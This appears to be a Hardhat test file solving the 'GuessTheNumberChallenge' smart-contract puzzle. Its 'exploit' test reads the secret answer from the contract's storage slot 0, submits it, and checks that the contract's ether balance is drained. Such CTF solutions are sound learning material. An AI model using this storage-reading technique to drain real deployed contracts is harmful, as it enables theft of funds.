import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNumberChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    
    //The contract just displays what the answer is.
    const answerHash = await target.provider.getStorageAt(target.address, 0);
    const answer = parseInt(answerHash);
    

    const tx = await target.guess(answer, {
      value: utils.parseEther('1')
    });

    await tx.wait();

    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
